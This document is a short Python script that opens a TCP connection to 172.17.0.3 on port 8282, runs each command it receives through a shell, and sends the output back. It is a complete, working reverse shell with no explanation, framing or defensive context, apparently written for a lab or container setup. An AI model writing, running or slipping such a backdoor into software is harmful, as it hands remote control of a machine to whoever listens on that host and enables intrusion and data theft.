import socket
import subprocess
h="172.17.0.3"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))
while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())